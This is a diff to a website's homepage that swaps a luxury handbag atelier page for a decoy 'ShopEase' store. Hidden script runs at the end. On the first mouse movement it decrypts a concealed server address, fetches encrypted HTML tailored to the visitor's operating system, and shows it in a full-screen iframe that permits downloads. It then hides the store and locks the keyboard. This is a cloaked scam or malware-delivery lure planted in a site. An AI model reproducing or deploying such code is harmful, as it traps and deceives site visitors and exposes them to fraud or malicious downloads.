@@ -1,21 +1,118 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CarryCouture &mdash; Haute Maroquinerie, Bespoke Leathercraft & Luxury Handbag Atelier</title>
-  <meta name="description" content="Discover exquisite Parisian leathercraft, hand saddle stitching (Point Sellier), full-grain French boxcalf, and bespoke luxury handbag atelier engineering at CarryCouture.">
-  <link rel="canonical" href="https://carrycouture.com/">
-  
-  <!-- Open Graph -->
-  <meta property="og:title" content="CarryCouture &mdash; Haute Maroquinerie & Luxury Handbag Atelier">
-  <meta property="og:description" content="Parisian hand saddle stitching, French calfskin curation, and bespoke architectural luxury leathercraft.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://carrycouture.com/">
-  <meta property="og:image" content="https://carrycouture.com/images/hero-haute-handbag.jpg">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  <!-- Stylesheet -->
-  <link rel="stylesheet" href="style.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
 
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
@@ -23,339 +120,193 @@
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <div class="reading-progress-bar" aria-hidden="true"></div>
-
-  <!-- Top Monogram Bar -->
-  <aside class="couture-top-bar">
-    <div class="container top-bar-flex">
-      <div class="atelier-badge-live">
-        <span class="atelier-dot-ping"></span>
-        <span>Maison de Maroquinerie Active &bull; Bespoke Commission Roster Open</span>
-      </div>
-      <div>
-        <span>Location: 181 Mercer Street, New York, NY 10012</span> &bull; 
-        <a href="tel:+18887775845" style="color: var(--gold-light);">Tel: +1-888-777-5845</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </aside>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- Floating Parisian Atelier Header -->
-  <header class="couture-header">
-    <div class="container header-flex-nav">
-      <a href="index.php" class="brand-atelier-link" aria-label="CarryCouture Home">
-        <div class="brand-crest-box">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-            <path d="M6 9V2h12v7M6 18H4a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-2M6 14h12v8H6v-8z"/>
-          </svg>
-        </div>
-        <div class="brand-wordmark">
-          <span class="brand-title-couture">CarryCouture</span>
-          <span class="brand-subtitle-couture">Haute Maroquinerie</span>
-        </div>
-      </a>
-
-      <ul class="couture-nav-menu">
-        <li><a href="index.php" class="couture-nav-link active">Maison</a></li>
-        <li><a href="about.html" class="couture-nav-link">Savoir-Faire</a></li>
-        <li><a href="blog.html" class="couture-nav-link">Journal</a></li>
-        <li><a href="#workbench" class="couture-nav-link">Craft Studio</a></li>
-        <li><a href="contact.html" class="couture-nav-link">Private Salon</a></li>
-      </ul>
-
-      <div class="header-action-cluster">
-        <button class="btn-theme-couture" aria-label="Toggle Atelier Palette">Atelier Light</button>
-        <a href="contact.html" class="btn-couture btn-gold-couture" style="padding: 0.55rem 1.4rem; font-size: 0.76rem;">Commission Bespoke</a>
-        <button class="mobile-toggle-couture" aria-label="Toggle Navigation">&#9776;</button>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-    </div>
-  </header>
-
-  <main id="main-content">
-
-    <!-- HERO EDITORIAL SHOWCASE -->
-    <section class="hero-atelier-section">
-      <div class="container">
-        <div class="hero-editorial-grid">
-          
-          <div>
-            <span class="badge-couture">Atelier des MÃ©tiers d'Art</span>
-            <h1 class="hero-editorial-title">The Architectural Soul of <em>Haute Maroquinerie</em></h1>
-            <p class="hero-editorial-desc">
-              CarryCouture represents the zenith of Parisian leathercraft. Each sculptural silhouette is hand-fashioned with two-needle beeswax saddle stitching (*Point Sellier*), full-grain French boxcalf, and hand-chiseled 24K gold-plated hardware.
-            </p>
-            <div style="display: flex; gap: 1.25rem; flex-wrap: wrap;">
-              <a href="#workbench" class="btn-couture btn-gold-couture">Explore Craft Studio</a>
-              <a href="blog.html" class="btn-couture btn-outline-gold">Read Leather Journal</a>
-            </div>
-
-            <div class="hero-stats-row">
-              <div class="stat-item">
-                <h4>58 Hrs</h4>
-                <p>Hand-Stitched Labor</p>
-              </div>
-              <div class="stat-item">
-                <h4>100%</h4>
-                <p>French Full-Grain</p>
-              </div>
-              <div class="stat-item">
-                <h4>24 Karat</h4>
-                <p>GuillochÃ© Hardware</p>
-              </div>
-            </div>
-          </div>
-
-          <!-- Right Column: Hero Visual Frame -->
-          <div>
-            <div class="hero-showcase-frame">
-              <div class="showcase-inner-image">
-                <img src="images/hero-haute-handbag.jpg" alt="Artisan hand-stitching luxury leather handbag with golden hardware" width="1200" height="800">
-              </div>
-              <div class="showcase-floating-card">
-                <h5>Maison Signature MinaudiÃ¨re</h5>
-                <p>Full-Grain Barenia Leather with hand-burnished raw edges & 24K gold turn-lock closure.</p>
-              </div>
-            </div>
-          </div>
-
-        </div>
-      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
 
-    <!-- SECTION 2: THE THREE PILLARS OF SAVOIR-FAIRE -->
-    <section class="section-padding">
-      <div class="container">
-        <div class="section-header-couture">
-          <span class="badge-couture">Artisanal Lineage</span>
-          <h2>The Pillars of Haute Maroquinerie</h2>
-          <p>Century-old hand techniques that separate fleeting seasonal accessories from heirloom architectural investments.</p>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-
-        <div class="atelier-pillars-grid">
-          
-          <div class="pillar-card-couture">
-            <div class="pillar-media-frame">
-              <img src="images/feature-saddle-stitching.jpg" alt="Two-needle saddle stitching on full-grain leather" width="800" height="500">
-            </div>
-            <div class="pillar-text-content">
-              <span class="badge-couture" style="margin-bottom: 0.75rem;">Saddle Stitch</span>
-              <h3>Point Sellier Double-Needle Seams</h3>
-              <p>Unlike sewing machine lockstitches that unravel if a single loop breaks, our hand saddle stitch crosses two waxed linen threads independently through pre-pricked awl holes, ensuring indestructible structural integrity.</p>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div class="pillar-card-couture">
-            <div class="pillar-media-frame">
-              <img src="images/feature-leather-tanning.jpg" alt="Full-grain French calfskin hides curated in atelier" width="800" height="500">
-            </div>
-            <div class="pillar-text-content">
-              <span class="badge-couture" style="margin-bottom: 0.75rem;">Tannery Heritage</span>
-              <h3>Tanneries du Puy & Annonay Boxcalf</h3>
-              <p>We source exclusively from heritage French tanneries. Our hides undergo slow botanical and mineral drumming, preserving natural dermal grain, supple elasticity, and a luminous patina that deepens with age.</p>
-            </div>
-          </div>
-
-          <div class="pillar-card-couture">
-            <div class="pillar-media-frame">
-              <img src="images/feature-gold-hardware.jpg" alt="24K gold plated lock mechanism with guilloche engraving" width="800" height="500">
-            </div>
-            <div class="pillar-text-content">
-              <span class="badge-couture" style="margin-bottom: 0.75rem;">Goldsmith Alchemy</span>
-              <h3>Solid Brass & 24K Gold Electroplating</h3>
-              <p>Every clasp, buckle, and foot peg is milled from solid jewelers brass, micro-polished to a mirror sheen, and electroplated with thick 24K gold or rare palladium to prevent oxidation over decades.</p>
-            </div>
-          </div>
-
         </div>
-      </div>
-    </section>
-
-    <!-- SECTION 3: INTERACTIVE LEATHER & HARDWARE CURATING CONSOLE -->
-    <section id="workbench" class="section-padding" style="background: var(--bg-couture-alt); border-top: 1px solid var(--gold-border); border-bottom: 1px solid var(--gold-border);">
-      <div class="container">
-        <div class="section-header-couture">
-          <span class="badge-couture">Bespoke Simulator</span>
-          <h2>The Haute Maroquinerie Craft Studio</h2>
-          <p>Configure artisan leather grades and precious hardware finishes to evaluate tensile density, patina evolution, and handcraft assembly duration.</p>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-
-        <div class="atelier-workbench-box">
-          <div class="workbench-controls-grid">
-            <div class="control-group">
-              <label for="workbench-leather-select">Select Heirloom Leather Grade</label>
-              <select id="workbench-leather-select" class="couture-select" aria-label="Select Leather Grade">
-                <option value="boxcalf">Full-Grain French Boxcalf (Tanneries d'Annonay)</option>
-                <option value="barenia">Barenia Saddle Calfskin (Double-Vegetable Tanned)</option>
-                <option value="togo">Togo Grained Baby Calf (Scratch-Resistant Drummed)</option>
-                <option value="chevre">ChÃ¨vre Mysore Mountain Goatskin (Spine Grain)</option>
-              </select>
-            </div>
-
-            <div class="control-group">
-              <label for="workbench-hardware-select">Select Goldsmith Clasp Hardware</label>
-              <select id="workbench-hardware-select" class="couture-select" aria-label="Select Hardware Finish">
-                <option value="gold">24K Yellow Gold Electroplated Solid Brass</option>
-                <option value="palladium">Solid Brushed Palladium (Platinum-Group Alloy)</option>
-                <option value="rosegold">18K Rose Gold with Satin GuillochÃ© Finish</option>
-              </select>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div class="workbench-metrics-grid">
-            <div class="metric-box-couture">
-              <h5>Dermal Tensile Density</h5>
-              <p id="metric-tensile">380 N/mm (High Tensile)</p>
-            </div>
-
-            <div class="metric-box-couture">
-              <h5>Patina Development Profile</h5>
-              <p id="metric-patina">Gloss Mirror Glaze (5-8 Yrs)</p>
-            </div>
-
-            <div class="metric-box-couture">
-              <h5>Artisanal Labor Dedicated</h5>
-              <p id="metric-hours">54 Handcraft Hours</p>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div style="margin-top: 2.5rem; padding: 1.25rem 1.75rem; background: var(--bg-couture-dark); border-radius: var(--radius-sm); border: 1px solid var(--gold-border); font-size: 0.88rem; color: var(--text-couture-muted); line-height: 1.7;">
-            <strong style="color: var(--gold-light);">MaÃ®tre Maroquinier Note:</strong> Barenia and Boxcalf leathers absorb natural oils from hand contact over decades, transforming the surface into a deep honey glaze while retaining structural tension across corners.
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- SECTION 4: ATELIER FAQ ACCORDION -->
-    <section class="section-padding">
-      <div class="container">
-        <div class="section-header-couture">
-          <span class="badge-couture">Atelier Inquiries</span>
-          <h2>Frequently Asked Questions on Bespoke Leathercraft</h2>
-          <p>Understanding hand saddle stitching, hide provenance, and heirloom maintenance.</p>
-        </div>
-
-        <div class="couture-faq-accordion">
-          
-          <div class="faq-couture-item active">
-            <button class="faq-couture-btn">
-              <span>Why is the hand saddle stitch (*Point Sellier*) superior to machine stitching?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-couture-content">
-              A sewing machine uses two distinct threads that loop around each other. If one thread abrades, the entire seam unravels like a zipper. The hand saddle stitch uses a single length of beeswax-coated French linen thread with a needle at each end. Every stitch is manually knotted through the hide. If one side is severed, the remaining knot holds the seam intact for generations.
-            </div>
-          </div>
-
-          <div class="faq-couture-item">
-            <button class="faq-couture-btn">
-              <span>How should full-grain French boxcalf and Barenia leather be cared for?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-couture-content">
-              Full-grain leathers breathe naturally and should never be coated in synthetic silicone sprays. Store your handbag in its cotton dust bag away from direct sunlight, maintain 45-55% relative humidity, and buff lightly with a dry microfiber cloth. Minor fingernail marks on Barenia leather can be rubbed away with circular thumb friction due to its high natural sebum content.
-            </div>
-          </div>
-
-          <div class="faq-couture-item">
-            <button class="faq-couture-btn">
-              <span>What is the commission lead time for a bespoke CarryCouture creation?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-couture-content">
-              Due to our unhurried artisanal process&mdash;where a single artisan hand-cuts, skives, stitches, and edge-burnishes each piece from beginning to end&mdash;bespoke commissions typically require 8 to 14 weeks from initial hide selection to final delivery in our Mercer Street salon.
-            </div>
-          </div>
-
-          <div class="faq-couture-item">
-            <button class="faq-couture-btn">
-              <span>Does CarryCouture offer lifelong spa restoration and edge re-burnishing?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-couture-content">
-              Yes. Every CarryCouture handbag includes lifetime atelier spa privileges. Our master craftsmen perform ultrasonic hardware cleaning, edge paint re-glazing with natural heated beeswax, and gentle leather nourishment to maintain structural elegance across decades.
-            </div>
-          </div>
-
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
 
-  </main>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <!-- HAUTE NOIR FOOTER -->
-  <footer class="couture-footer">
-    <div class="container">
-      <div class="footer-grid-couture">
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19zuvqNStdWqLITaXcTbzzMIVzUdZfBezpGAYjWzoU4LxBTe6vV2KgX";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
         
-        <div class="footer-brand-pane">
-          <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem;">
-            <div class="brand-crest-box" style="width: 38px; height: 38px;">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                <path d="M6 9V2h12v7M6 18H4a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-2M6 14h12v8H6v-8z"/>
-              </svg>
-            </div>
-            <span style="font-family: var(--font-luxury); font-size: 1.5rem; color: #ffffff; letter-spacing: 0.08em;">CarryCouture</span>
-          </div>
-          <p>
-            Maison de Haute Maroquinerie dedicated to the preservation of classical French leathercraft, two-needle saddle stitching, and heirloom handbag architectural design.
-          </p>
-        </div>
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-        <div class="footer-col-couture">
-          <h4>Atelier Navigation</h4>
-          <ul>
-            <li><a href="index.php">Maison Home</a></li>
-            <li><a href="about.html">Savoir-Faire</a></li>
-            <li><a href="blog.html">Leather Journal</a></li>
-            <li><a href="#workbench">Craft Studio</a></li>
-            <li><a href="contact.html">Private Salon</a></li>
-          </ul>
-        </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <div class="footer-col-couture">
-          <h4>Legal & Governance</h4>
-          <ul>
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms of Service</a></li>
-            <li><a href="disclaimer.html">Atelier Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-
-        <div class="footer-col-couture">
-          <h4>Atelier Salon</h4>
-          <p style="font-size: 0.88rem; line-height: 1.7; color: #a19d95;">
-            <strong>Maison Flagship:</strong><br>
-            181 Mercer Street,<br>
-            New York, NY 10012,<br>
-            United States
-          </p>
-          <p style="margin-top: 0.85rem; font-size: 0.88rem;">
-            <strong>Private Concierge:</strong><br>
-            <a href="tel:+18887775845" style="color: var(--gold-light);">+1-888-777-5845</a>
-          </p>
-        </div>
-
-      </div>
-
-      <div class="footer-strip-couture">
-        <div>
-          &copy; <?php echo date('Y'); ?> CarryCouture Atelier. All rights reserved. Parisian Savoir-Faire.
-        </div>
-        <div class="footer-strip-links">
-          <a href="privacy.html">Privacy</a>
-          <a href="terms.html">Terms</a>
-          <a href="disclaimer.html">Disclaimer</a>
-          <a href="cookies.html">Cookies</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-
-  <script src="script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
